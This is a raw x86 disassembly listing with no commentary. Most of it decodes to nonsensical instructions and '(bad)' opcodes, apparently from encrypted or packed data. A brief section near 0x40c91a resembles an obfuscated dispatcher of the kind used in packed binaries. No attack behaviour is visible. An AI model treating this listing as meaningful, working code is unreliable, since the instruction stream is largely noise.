  40c654:	fbstp  TBYTE PTR [ebx-0x5bc3ee78]
  40c65a:	xor    al,0x13
  40c65c:	dec    esi
  40c65d:	push   ebx
  40c65e:	aad    0x31
  40c660:	inc    ebx
  40c661:	adc    eax,DWORD PTR [edi]
  40c663:	inc    ebp
  40c664:	push   ebp
  40c665:	sub    DWORD PTR [edx-0x24fb6ac],0x6c2b122e
  40c66f:	jmp    0x40c6cf
  40c671:	mov    ds:0x479b3cdc,al
  40c676:	cld    
  40c677:	loop   0x40c6a6
  40c679:	cmp    eax,0xe1ea26b3
  40c67e:	lods   eax,DWORD PTR ds:[esi]
  40c67f:	push   edx
  40c680:	popf   
  40c681:	jae    0x40c6f7
  40c683:	mov    ch,0x40
  40c685:	test   ecx,esp
  40c687:	mov    ds:0x96128b8,al
  40c68c:	push   0x6f236eb5
  40c691:	and    eax,0x3b1bcb55
  40c696:	xor    DWORD PTR [ecx],esp
  40c698:	xchg   edi,eax
  40c699:	stos   BYTE PTR es:[edi],al
  40c69a:	enter  0xa0b6,0xf3
  40c69e:	pop    ebx
  40c69f:	pop    ecx
  40c6a0:	mov    al,ds:0x282a9e65
  40c6a5:	je     0x40c6c8
  40c6a7:	sub    al,0x50
  40c6a9:	mov    esi,0xba64c6bf
  40c6ae:	scas   al,BYTE PTR es:[edi]
  40c6af:	mov    edx,DWORD PTR [ebx-0x7d]
  40c6b2:	jae    0x40c6a2
  40c6b4:	adc    DWORD PTR [ebp-0x24cec54d],ebx
  40c6ba:	cmp    ebp,DWORD PTR ds:0x917d1839
  40c6c0:	mov    edi,0x7f5acff5
  40c6c5:	adc    al,0xd0
  40c6c7:	pop    ds
  40c6c8:	pop    ds
  40c6c9:	mov    al,BYTE PTR [esi-0x53]
  40c6cc:	(bad)  
  40c6cd:	cmc    
  40c6ce:	jb     0x40c68a
  40c6d0:	cli    
  40c6d1:	repz popa 
  40c6d3:	add    BYTE PTR [ebx+ecx*2],0x84
  40c6d7:	push   DWORD PTR [eax]
  40c6d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6da:	inc    ebx
  40c6db:	jp     0x40c6b1
  40c6dd:	or     esi,esi
  40c6df:	iret   
  40c6e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6e1:	mov    al,ds:0x331bb2c3
  40c6e6:	pop    eax
  40c6e7:	dec    esi
  40c6e8:	sahf   
  40c6e9:	je     0x40c6db
  40c6eb:	jp     0x40c701
  40c6ed:	lods   al,BYTE PTR ds:[esi]
  40c6ee:	push   ss
  40c6ef:	in     eax,dx
  40c6f0:	popf   
  40c6f1:	fbld   TBYTE PTR [ecx-0x59b1bc3]
  40c6f7:	int    0x3d
  40c6f9:	ds scas eax,DWORD PTR es:[edi]
  40c6fb:	xor    DWORD PTR [ecx+0x47],0xf60fbe38
  40c702:	xor    al,0x99
  40c704:	and    dl,dh
  40c706:	or     DWORD PTR [ecx+0x4adeaab3],eax
  40c70c:	lahf   
  40c70d:	mov    eax,ds:0xe0808c8d
  40c712:	inc    esi
  40c713:	cwde   
  40c714:	cmp    DWORD PTR [ebx+0x4cfed464],0xa4ea905a
  40c71e:	push   ecx
  40c71f:	int    0x25
  40c721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c722:	push   0x293b120f
  40c727:	fldcw  WORD PTR [ebx]
  40c729:	cmc    
  40c72a:	leave  
  40c72b:	je     0x40c70e
  40c72d:	fimul  WORD PTR [edx+0x2b]
  40c730:	push   ebx
  40c731:	fdivr  QWORD PTR [ebp+0x298d109c]
  40c737:	mov    ch,0x57
  40c739:	xor    al,0x53
  40c73b:	xor    dh,BYTE PTR [ebp-0x3f]
  40c73e:	int3   
  40c73f:	icebp  
  40c740:	and    edx,DWORD PTR [edi+0x3f]
  40c743:	push   cs
  40c744:	xor    al,0x43
  40c746:	push   ss
  40c747:	jmp    DWORD PTR [edx+0x5a]
  40c74a:	out    dx,eax
  40c74b:	mov    eax,0x1f079567
  40c750:	adc    al,0xc3
  40c752:	pop    edx
  40c753:	jbe    0x40c7ac
  40c755:	inc    eax
  40c756:	jp     0x40c79c
  40c758:	(bad)  [ebx-0x6e4779dd]
  40c75e:	pop    ebp
  40c75f:	adc    al,0x95
  40c761:	jb     0x40c73b
  40c763:	mov    WORD PTR [ebp-0x2be4b314],ss
  40c769:	scas   al,BYTE PTR es:[edi]
  40c76a:	pop    ds
  40c76b:	mov    ds:0x8de0d0bf,al
  40c770:	ret    
  40c771:	out    dx,eax
  40c772:	aam    0x2
  40c774:	add    eax,0xb8ee8ee3
  40c779:	cmp    al,0x0
  40c77b:	fisttp DWORD PTR [eax-0x45db53af]
  40c781:	pop    edi
  40c782:	fild   WORD PTR [edx-0x29]
  40c785:	and    al,0x12
  40c787:	mov    eax,ds:0xad48ab75
  40c78d:	jle    0x40c7b1
  40c78f:	ins    DWORD PTR es:[edi],dx
  40c790:	or     cl,0xad
  40c793:	inc    esp
  40c794:	inc    edi
  40c795:	xor    BYTE PTR [edi],dl
  40c797:	sub    DWORD PTR [ecx+ebp*2-0x26],0x4e9b5105
  40c79f:	ret    0xf689
  40c7a2:	pop    esi
  40c7a3:	inc    ecx
  40c7a4:	mov    ds:0xc6abf0f8,eax
  40c7a9:	imul   eax,DWORD PTR [edi+eax*1+0x3c],0xe0cc6e98
  40c7b1:	jmp    0x40c80f
  40c7b3:	sbb    al,BYTE PTR [ebx+ecx*8]
  40c7b6:	add    BYTE PTR [esi-0x43],dl
  40c7b9:	(bad)  
  40c7ba:	(bad)  
  40c7bb:	cwde   
  40c7bc:	pop    esi
  40c7bd:	mov    al,ds:0xf6a0a570
  40c7c2:	pop    eax
  40c7c3:	cmp    edx,ebx
  40c7c5:	lahf   
  40c7c6:	cmp    ebx,esp
  40c7c8:	mov    dl,0x61
  40c7ca:	in     al,0xde
  40c7cc:	mov    ds:0x31074af2,al
  40c7d1:	rol    DWORD PTR [ebx+0x2440749a],1
  40c7d7:	(bad)
  40c7da:	adc    BYTE PTR [esi-0x25d0cebc],ch
  40c7e0:	mov    cl,0x93
  40c7e2:	popa   
  40c7e3:	mov    esp,0x14624a29
  40c7e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7e9:	and    al,0x4b
  40c7eb:	fwait
  40c7ec:	xchg   BYTE PTR [ebx+0xab09b9],ah
  40c7f2:	repnz imul edi,ecx,0xffffffea
  40c7f6:	mov    ebx,0xab5ff3fa
  40c7fb:	and    al,0x95
  40c7fd:	inc    eax
  40c7fe:	dec    esp
  40c7ff:	cdq    
  40c800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c801:	inc    edi
  40c802:	jno    0x40c7ae
  40c804:	and    DWORD PTR [edi+0x8fa113],ebx
  40c80a:	pop    es
  40c80b:	add    dh,BYTE PTR [ecx-0x6465b4a7]
  40c811:	ffree  st(7)
  40c813:	ds stc 
  40c815:	mov    esp,0x689cbdfe
  40c81a:	je     0x40c848
  40c81c:	jg     0x40c81f
  40c81e:	inc    ecx
  40c81f:	xchg   ebp,eax
  40c820:	adc    eax,0x348b5c06
  40c825:	inc    esi
  40c826:	adc    esi,DWORD PTR [ecx]
  40c828:	rcl    BYTE PTR [eax+0x61],cl
  40c82b:	cmp    cl,BYTE PTR [eax]
  40c82d:	je     0x40c877
  40c82f:	loope  0x40c87c
  40c831:	out    0xd7,al
  40c833:	ss aam 0xd
  40c836:	jo     0x40c88c
  40c838:	enter  0x5f4e,0xbc
  40c83c:	leave  
  40c83d:	pop    esp
  40c83e:	add    al,0x50
  40c840:	jmp    0x5b22:0x86e156a5
  40c847:	cmp    eax,esp
  40c849:	call   0xcc841ee5
  40c84e:	outs   dx,BYTE PTR ds:[esi]
  40c84f:	scas   eax,DWORD PTR es:[edi]
  40c850:	sub    ecx,DWORD PTR [eax]
  40c852:	or     BYTE PTR [esi+0x4dbeec0b],dh
  40c858:	loope  0x40c846
  40c85a:	or     BYTE PTR [eax+0x198dd7b4],bl
  40c860:	mov    edx,0xcc25ea44
  40c865:	sbb    BYTE PTR [ebp-0x5a],cl
  40c868:	cdq    
  40c869:	pop    ebp
  40c86a:	inc    ecx
  40c86b:	cwde   
  40c86c:	icebp  
  40c86d:	jo     0x40c8dc
  40c86f:	add    BYTE PTR [edi],0xe3
  40c872:	sub    al,0x16
  40c874:	aam    0x5c
  40c876:	nop
  40c877:	retf   
  40c878:	and    eax,0xb2c1f1f3
  40c87d:	mov    ebx,0x1098c6cf
  40c882:	out    dx,al
  40c883:	in     eax,dx
  40c884:	cmp    eax,0xfd542cf8
  40c889:	jg     0x40c8ca
  40c88b:	fsubp  st(4),st
  40c88d:	pushf  
  40c88e:	or     eax,eax
  40c890:	jg     0x40c876
  40c892:	mov    edi,0xb4d1a5e8
  40c897:	pop    ecx
  40c898:	xor    bh,BYTE PTR [ecx-0x630ead11]
  40c89e:	test   DWORD PTR [edx+edx*1+0x19],eax
  40c8a2:	cmp    DWORD PTR [esi+0x22234ca],ecx
  40c8a8:	cmp    eax,0x6a1b0f78
  40c8ad:	inc    ebp
  40c8ae:	mov    ds:0xd523417a,al
  40c8b3:	sbb    BYTE PTR [ecx+esi*8+0x27],cl
  40c8b7:	mov    esi,0x114f9e35
  40c8bc:	jne    0x40c92b
  40c8be:	add    dl,BYTE PTR ss:[eax-0x2f]
  40c8c2:	imul   sp,WORD PTR [esi-0x7b69a342],0xa
  40c8ca:	inc    esi
  40c8cb:	pop    esi
  40c8cc:	cmp    DWORD PTR [edi+0x1b],ebp
  40c8cf:	xchg   edi,eax
  40c8d0:	ret    
  40c8d1:	(bad)  [esi]
  40c8d3:	pop    esp
  40c8d4:	cmp    edi,DWORD PTR [esi-0x37b6df51]
  40c8da:	adc    BYTE PTR ds:0x2d6b536c,ch
  40c8e0:	dec    edx
  40c8e1:	les    ecx,FWORD PTR [esi+0x18134bc4]
  40c8e7:	xchg   DWORD PTR [eax],edi
  40c8e9:	sub    bl,0xf9
  40c8ec:	mov    cl,0x7d
  40c8ee:	inc    esi
  40c8ef:	pop    edx
  40c8f0:	jmp    0x40c954
  40c8f2:	pop    es
  40c8f3:	push   ds
  40c8f4:	enter  0xf631,0x86
  40c8f8:	sbb    ecx,DWORD PTR [esp+esi*8-0x4af059f9]
  40c8ff:	pop    eax
  40c900:	sbb    DWORD PTR [edx+0x611425f9],0x7a7b5bc4
  40c90a:	xor    ebp,DWORD PTR [ebx-0x6a]
  40c90d:	pop    esi
  40c90e:	mov    eax,ds:0xab1b97a4
  40c913:	xchg   ecx,eax
  40c914:	(bad)  
  40c915:	add    al,0xa
  40c917:	or     BYTE PTR [ecx],bh
  40c919:	pushf  
  40c91a:	mov    eax,DWORD PTR [ebp-0x20]
  40c91d:	mov    edx,DWORD PTR [ebp-0x8]
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0x244c5e53
  40c96a:	lahf   
  40c96b:	cdq    
  40c96c:	aaa    
  40c96d:	xor    bl,BYTE PTR [ebp+0x7e747878]
  40c973:	js     0x40c9ed
  40c975:	ror    DWORD PTR [esi-0x81db85e],0x9b
  40c97c:	inc    ebp
  40c97d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c97e:	cdq    
  40c97f:	jmp    0x40c919
  40c981:	leave  
  40c982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c983:	sbb    BYTE PTR [esi],ah
  40c985:	cmp    DWORD PTR [edi+eax*1+0x1c],0x2b
  40c98a:	pop    edi
  40c98b:	icebp  
  40c98c:	and    DWORD PTR [esi-0x1ac76c95],eax
  40c992:	mov    edi,0xe799e650
  40c997:	fcmovnb st,st(5)
  40c999:	adc    eax,0xa070c882
  40c99e:	mov    al,BYTE PTR [eax+0x43c3f88f]
  40c9a4:	into   
  40c9a5:	jle    0x40c9f4
  40c9a7:	add    al,0x14
  40c9a9:	mov    ecx,0x399f69ed
  40c9ae:	outs   dx,BYTE PTR ds:[esi]
  40c9af:	or     ebp,ecx
  40c9b1:	inc    edi
  40c9b2:	xor    BYTE PTR [edx-0x7d],0xf6
  40c9b6:	inc    edi
  40c9b7:	dec    ebp
  40c9b8:	sub    al,0xe5
  40c9ba:	frstor [edi]
  40c9bc:	shl    BYTE PTR [ebx+0x2],0x91
  40c9c0:	inc    ebp
  40c9c1:	je     0x40c95b
  40c9c3:	sub    al,0xd7
  40c9c5:	arpl   WORD PTR [eax+0x12a7ed11],bp
  40c9cb:	stos   BYTE PTR es:[edi],al
  40c9cc:	cs adc al,0x18
  40c9cf:	fnsave [esi+0x19]
  40c9d2:	je     0x40c9a9
  40c9d4:	and    BYTE PTR [esi+0x391b28ae],ah
  40c9da:	mov    al,ds:0x7298a3cd
  40c9df:	xchg   DWORD PTR ds:[edx],eax
  40c9e2:	sub    al,0x45
  40c9e4:	(bad)  
  40c9e7:	sub    dl,dh
  40c9e9:	jns    0x40c991
  40c9eb:	fnstcw WORD PTR [esi+0x3dcbfdc8]
  40c9f1:	imul   ecx,edi,0xffffff97
  40c9f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9f5:	clc    
  40c9f6:	jl     0x40ca4c
  40c9f8:	jecxz  0x40ca05
  40c9fa:	dec    edx
  40c9fb:	test   DWORD PTR [edx],0xd9e0c656
  40ca01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca02:	scas   eax,DWORD PTR es:[edi]
  40ca03:	pop    ds
  40ca04:	xor    DWORD PTR [edi+0x365e2de],esp
  40ca0a:	add    ebx,DWORD PTR [edi]
  40ca0c:	mov    ch,0x3e
  40ca0e:	lods   al,BYTE PTR ds:[esi]
  40ca0f:	psrad  mm3,mm6
  40ca12:	and    eax,ebp
  40ca14:	or     DWORD PTR [edx],edx
  40ca16:	iret   
  40ca17:	(bad)  
  40ca18:	push   ecx
  40ca19:	cli    
  40ca1a:	shl    bl,0xd7
  40ca1d:	and    al,0x82
  40ca1f:	cld    
  40ca20:	lock data16 in al,0xa9
  40ca24:	retf   
  40ca25:	popa   
  40ca26:	mov    edi,0x683488ad
  40ca2b:	and    DWORD PTR [eax],esp
  40ca2d:	retf   
  40ca2e:	xchg   esp,eax
  40ca2f:	fidiv  WORD PTR [eax-0x3a]
  40ca32:	xchg   BYTE PTR [ecx+0x49],ch
  40ca35:	cs pop esp
  40ca37:	js     0x40caa7
  40ca39:	stos   DWORD PTR es:[edi],eax
  40ca3a:	dec    ebx
  40ca3b:	mov    cl,0xb9
  40ca3d:	mov    ch,0xad
  40ca3f:	jnp    0x40ca1b
  40ca41:	das    
  40ca42:	outs   dx,DWORD PTR ds:[esi]
  40ca43:	xor    bl,bh
  40ca45:	dec    esp
  40ca46:	push   cs
  40ca47:	idiv   edx
  40ca49:	adc    al,0x8
  40ca4b:	mov    bh,dh
  40ca4d:	jge    0x40ca36
  40ca4f:	ror    ebp,0x5d
  40ca52:	push   ecx
  40ca53:	add    eax,0x74e265e9
  40ca58:	ror    DWORD PTR [ebx-0x44],cl
  40ca5b:	test   eax,0xc65650e
  40ca60:	dec    edx
  40ca61:	dec    esi
  40ca62:	rcr    BYTE PTR [ebx+ebp*1],cl
  40ca65:	xchg   edx,eax
  40ca66:	xchg   DWORD PTR [edx],esp
  40ca68:	pop    es
  40ca69:	rcr    ebp,1
  40ca6b:	loopne 0x40ca08
  40ca6d:	or     dl,BYTE PTR [ecx-0x1528dfb0]
  40ca73:	in     eax,dx
  40ca74:	xor    al,0xb2
  40ca76:	mov    ds:0x73e16b64,eax
  40ca7b:	aad    0xcb
  40ca7d:	pop    esi
  40ca7e:	mov    esi,0x6c1773eb
  40ca83:	leave  
  40ca84:	push   ss
  40ca85:	and    edi,edx
  40ca87:	fdivr  st,st(0)
  40ca89:	daa    
  40ca8a:	push   ss
  40ca8b:	bswap  ebx
  40ca8d:	push   DWORD PTR [esi+0x75]
  40ca90:	xor    BYTE PTR [eax],dh
  40ca92:	jne    0x40caf4
  40ca94:	cs adc ch,bl
  40ca97:	jp     0x40ca4f
  40ca99:	and    al,0xa6
  40ca9b:	mov    ds:0x147915d5,al
  40caa0:	pop    es
  40caa1:	pop    edx
  40caa2:	push   eax
  40caa3:	(bad)  
  40caa4:	out    0xcc,al
  40caa6:	addr16 cwde 
  40caa8:	xchg   esp,eax
  40caa9:	inc    esi
  40caaa:	aas    
  40caab:	das    
  40caac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caad:	adc    al,0x47
  40caaf:	leave  
  40cab0:	lea    edi,[esi+0x35d4ba57]
  40cab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cab8:	push   cs
  40cab9:	adc    DWORD PTR [edx+eax*8-0x6ce181eb],edi
  40cac0:	imul   BYTE PTR [edx+0x2b]
  40cac3:	repz adc cl,0xa6
  40cac7:	(bad)  [edx]
  40cac9:	push   0x2a
  40cacb:	not    DWORD PTR [ebp+ecx*8-0x79]
  40cacf:	nop
  40cad0:	ds mov edx,0x4b4c2930
  40cad6:	pop    edi
  40cad7:	dec    esi
  40cad8:	in     al,dx
  40cad9:	add    eax,0x49d70dba
  40cade:	xchg   edx,eax
  40cadf:	mov    dl,0x6d
  40cae1:	sub    al,0xa0
  40cae3:	lods   eax,DWORD PTR ds:[esi]
  40cae4:	dec    edx
  40cae5:	out    0xa7,al
  40cae7:	adc    al,0x14
  40cae9:	xchg   esi,eax
  40caea:	cmp    eax,0x1f36c10
  40caef:	push   es
  40caf0:	into   
  40caf1:	dec    esp
  40caf2:	adc    DWORD PTR [esi+0x7d44961],edi
  40caf8:	push   ecx
  40caf9:	sbb    ah,bl
  40cafb:	mov    edx,ebx
  40cafd:	xor    bl,BYTE PTR [ebx]
  40caff:	xchg   edi,eax
  40cb00:	jb     0x40cb6c
  40cb02:	dec    ecx
  40cb03:	xchg   esp,eax
  40cb04:	pop    ds
  40cb05:	pop    es
  40cb06:	(bad)  
  40cb07:	pop    edx
  40cb08:	jbe    0x40cb19
  40cb0a:	or     bl,0x9
  40cb0d:	dec    ebx
  40cb0e:	add    edi,DWORD PTR [eax]
  40cb10:	das    
  40cb11:	add    BYTE PTR [esi-0x7],bh
  40cb14:	or     ecx,eax
  40cb16:	lods   al,BYTE PTR ds:[esi]
  40cb17:	mov    WORD PTR [ecx+0x7ae189d8],?
  40cb1d:	xor    DWORD PTR [ebx],ecx
  40cb1f:	push   0xffffff99
  40cb21:	xor    eax,ebp
  40cb23:	sbb    dl,dh
  40cb25:	(bad)  
  40cb26:	push   ebp
  40cb27:	stos   DWORD PTR es:[edi],eax
  40cb28:	sbb    al,0xda
  40cb2a:	jb     0x40cb61
  40cb2c:	inc    edi
  40cb2d:	gs sbb al,0xee
  40cb30:	leave  
  40cb31:	bound  edi,QWORD PTR [ecx+0x67]
  40cb34:	lock add esi,ebx
  40cb37:	jp     0x40cb10
  40cb39:	adc    al,0x39
  40cb3b:	pop    es
  40cb3c:	xchg   ecx,eax
  40cb3d:	call   0xd6c6:0x493d5b3
  40cb44:	jbe    0x40cafb
  40cb46:	and    eax,DWORD PTR [edx]
  40cb48:	in     al,0x8
  40cb4a:	mov    bh,BYTE PTR ds:0x1c5624c7
  40cb50:	jns    0x40cb59
  40cb52:	fmul   QWORD PTR [eax+0x7]
  40cb55:	and    BYTE PTR [eax+0x3f494969],al
  40cb5b:	ret    0xd9cb
  40cb5e:	arpl   WORD PTR [esi-0x1c7c8b45],sp
  40cb64:	mov    DWORD PTR [ebx],0x7681b1e
  40cb6a:	loope  0x40cb56
  40cb6c:	lods   al,BYTE PTR ds:[esi]
  40cb6d:	jno    0x40cb2a
  40cb6f:	in     al,0x63
  40cb71:	aas    
  40cb72:	loopne 0x40cba5
  40cb74:	sahf   
  40cb75:	cmc    
  40cb76:	imul   edx,ecx,0xdb5925f5
  40cb7c:	jbe    0x40cbaf
  40cb7e:	jns    0x40cbbd
  40cb80:	retf   0xc34a
  40cb83:	jmp    0x3581518f
  40cb88:	mov    ebp,0x12b08861
  40cb8d:	outs   dx,BYTE PTR ds:[esi]
  40cb8e:	data16 int3 
  40cb90:	ins    BYTE PTR es:[edi],dx
  40cb91:	mov    bh,0x98
  40cb93:	or     DWORD PTR [ebx+edx*2],edi
  40cb96:	xchg   BYTE PTR [ebp-0x4ee9632b],bl
  40cb9c:	mov    bh,0x9a
  40cb9e:	dec    edx
  40cb9f:	rcr    DWORD PTR [eax+ecx*4+0x3b],0xce
  40cba4:	xchg   DWORD PTR [eax+0x6cdaa1c9],edi
  40cbaa:	scas   eax,DWORD PTR es:[edi]
  40cbab:	int    0x24
  40cbad:	call   0xdd6e:0xe77130a4
  40cbb4:	xchg   ebp,eax
  40cbb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbb6:	push   ss
  40cbb7:	ficomp DWORD PTR [edi-0x6a]
  40cbba:	je     0x40cb9d
  40cbbc:	sub    eax,0x66b4bfe4
  40cbc1:	dec    ecx
  40cbc2:	cmp    al,0x7d
  40cbc4:	add    eax,0x90af1385
  40cbc9:	inc    eax
  40cbca:	(bad)  
  40cbcb:	xor    BYTE PTR [edx-0x58],bh
  40cbce:	mul    eax
  40cbd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbd1:	cmp    cl,BYTE PTR [ebx]
  40cbd3:	(bad)  
  40cbd4:	lahf   
  40cbd5:	and    eax,0x91ad50a0
  40cbda:	xor    BYTE PTR [edi+0x19349289],0x5
  40cbe1:	push   es
  40cbe2:	xor    ch,BYTE PTR [ecx-0x78]
  40cbe5:	fwait
  40cbe6:	test   al,0xee
  40cbe8:	shr    BYTE PTR [eax-0x4f],0x26
  40cbec:	lods   eax,DWORD PTR ds:[esi]
  40cbed:	ja     0x40cc14
  40cbef:	inc    ecx
  40cbf0:	and    eax,DWORD PTR [eax+0x64]
  40cbf3:	cmp    ah,dh
  40cbf5:	push   ss
  40cbf6:	fisub  WORD PTR [esi+0x6a3855f0]
  40cbfc:	adc    esi,ebx
  40cbfe:	js     0x40cbf7
  40cc00:	pop    eax
  40cc01:	int    0xec
  40cc03:	sub    BYTE PTR [eax+ecx*1],ch
  40cc06:	mov    ebx,DWORD PTR [ebp+0xb4c993b]
  40cc0c:	lahf   
  40cc0d:	stc    
  40cc0e:	mov    esi,DWORD PTR [esi]
  40cc10:	fmul   st(4),st
  40cc12:	enter  0x1cef,0x22
  40cc16:	leave  
  40cc17:	mov    ecx,0x16faf866
  40cc1c:	mov    eax,ds:0x88fd3e6c
  40cc21:	add    BYTE PTR [eax+0x2664e364],al
  40cc27:	inc    ecx
  40cc28:	mov    edx,0x8000ac6b
  40cc2d:	inc    esp
  40cc2e:	retf   
  40cc2f:	outs   dx,BYTE PTR ds:[esi]
  40cc30:	out    dx,al
  40cc31:	mov    bh,0x9b
  40cc33:	imul   esi,DWORD PTR [edx+eiz*2-0x26],0xe01e784
  40cc3b:	push   ds
  40cc3c:	push   eax
  40cc3d:	cli    
  40cc3e:	jmp    0x40cc48
  40cc40:	lods   al,BYTE PTR ds:[si]
  40cc42:	inc    esp
  40cc43:	aad    0x96
  40cc45:	mov    ch,bl
  40cc47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc48:	nop
  40cc49:	mov    al,ds:0x2d95f548
  40cc4e:	outs   dx,DWORD PTR ds:[esi]
  40cc4f:	clc    
  40cc50:	sbb    eax,0xbb7dcede
  40cc55:	push   ebx
  40cc56:	xchg   ecx,eax
  40cc57:	mov    bh,BYTE PTR [edx-0x1653a68c]
  40cc5d:	mov    ebp,0x3dc4eb9d
  40cc62:	xor    al,0x33
  40cc64:	stos   DWORD PTR es:[edi],eax
  40cc65:	fs push esp
  40cc67:	or     ebx,DWORD PTR [edx+ebp*4+0x33c8c174]
  40cc6e:	mov    ch,0xe4
  40cc70:	mov    WORD PTR [ecx],?
  40cc72:	cmp    cl,ch
  40cc74:	adc    al,0x3
  40cc76:	add    BYTE PTR [eax],al
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0x9a
  40cc85:	cmp    al,0x7d
  40cc87:	dec    ecx
  40cc88:	mov    cs:0x7e747878,al
  40cc8e:	js     0x40cd08
  40cc90:	push   ss
  40cc91:	loopne 0x40ccbd
  40cc93:	jno    0x40ccb0
  40cc95:	cmp    BYTE PTR [ecx+0xa],ah
  40cc98:	mov    ds:0x59309f6d,eax
  40cc9d:	jl     0x40cca1
  40cc9f:	push   edi
  40cca0:	dec    ebx
  40cca1:	out    0x63,eax
  40cca3:	(bad)  
  40cca4:	dec    ebx
  40cca5:	sbb    BYTE PTR [esi-0x21],ch
  40cca8:	mov    ch,0xff
  40ccaa:	or     esi,DWORD PTR [eax-0x25b10b5f]
  40ccb0:	adc    BYTE PTR [edx+ebp*2],0xd8
  40ccb4:	sub    cl,cl
  40ccb6:	pop    eax
  40ccb7:	jb     0x40ccb5
  40ccb9:	mov    bh,BYTE PTR [esi+edx*4-0x2b]
  40ccbd:	add    bh,ah
  40ccbf:	mov    eax,0xfea7fc83
  40ccc4:	cmp    esp,esi
  40ccc6:	mov    eax,ds:0xf8663d46
  40cccb:	leave  
  40cccc:	adc    esi,DWORD PTR [ecx+ebp*8-0x40e1ebd8]
  40ccd3:	imul   esp,ecx,0xffffffd5
  40ccd6:	or     BYTE PTR [ebx+0x29],bl
  40ccd9:	dec    edi
  40ccda:	mov    edx,DWORD PTR [edx-0x27a14614]
  40cce0:	push   ebx
  40cce1:	lea    eax,ds:[edx-0x1c]
  40cce5:	xchg   ebx,eax
  40cce6:	sub    esp,DWORD PTR [edi-0x10b8ee80]
  40ccec:	ja     0x40ccd1
  40ccee:	or     DWORD PTR [ebx],esp
  40ccf0:	dec    ebx
  40ccf1:	fld    QWORD PTR [ebp-0x6edfcccc]
  40ccf7:	mov    dl,0x32
  40ccf9:	pop    es
  40ccfa:	inc    edi
  40ccfb:	sbb    DWORD PTR [ebp+0x74f70b7b],edx
  40cd01:	shl    DWORD PTR [edx+0x1ca6d81f],0x6
  40cd08:	sub    dh,BYTE PTR [ebx]
  40cd0a:	sbb    al,0xa7
  40cd0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd0e:	or     bh,BYTE PTR [ebx+0xa]
  40cd11:	pop    ebp
  40cd12:	fsub   st,st(2)
  40cd14:	xchg   ebx,eax
  40cd15:	mov    bl,bh
  40cd17:	dec    edx
  40cd18:	cs inc ecx
  40cd1a:	dec    edi
  40cd1b:	aam    0xaa
  40cd1d:	repz sub DWORD PTR [ecx+0x4dfeafed],edx
  40cd24:	push   ebp
  40cd25:	xor    dh,bh
  40cd27:	mov    esp,0x23adc7b
  40cd2c:	bnd call 0xa040f690
  40cd32:	pop    ebx
  40cd33:	cmp    bl,BYTE PTR [ebp+0x32]
  40cd36:	xlat   BYTE PTR ds:[ebx]
  40cd37:	imul   esi,esp,0xd5fac84
  40cd3d:	inc    ebp
  40cd3e:	(bad)  
  40cd3f:	(bad)  
  40cd40:	jb     0x40cd33
  40cd42:	sub    BYTE PTR [ebx-0x6234e76d],0x98
  40cd49:	dec    esi
  40cd4a:	push   ecx
  40cd4b:	dec    edi
  40cd4c:	sbb    dh,bh
  40cd4e:	or     DWORD PTR [ebp-0x478449e5],esp
  40cd54:	xor    BYTE PTR es:[edi],0xe9
  40cd58:	es (bad) 
  40cd5a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd5c:	jg     0x40cd96
  40cd5e:	shl    ch,0x9d
  40cd61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd62:	or     DWORD PTR [eax-0x4195d064],0x38
  40cd69:	imul   ebp,DWORD PTR [edi],0xffffffbc
  40cd6c:	jbe    0x40cd45
  40cd6e:	xchg   edx,eax
  40cd6f:	mov    cl,0x9c
  40cd71:	xor    dl,BYTE PTR [ebx-0x5c0bc71e]
  40cd77:	cmp    ebx,esi
  40cd79:	xchg   esi,ebx
  40cd7b:	pop    edx
  40cd7c:	add    cl,BYTE PTR [ebp-0x1d]
  40cd7f:	jo     0x40cda6
  40cd81:	cmp    eax,ebp
  40cd83:	sub    eax,0x4569dbb3
  40cd88:	test   DWORD PTR [esp+ebx*2],esi
  40cd8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd8c:	cmp    dh,cl
  40cd8e:	loopne 0x40cd10
  40cd90:	ins    BYTE PTR es:[edi],dx
  40cd91:	sub    al,0x34
  40cd93:	das    
  40cd94:	sub    BYTE PTR [ebp+0x9],dl
  40cd97:	mov    dh,BYTE PTR [ebx]
  40cd99:	cs jb  0x40cdf5
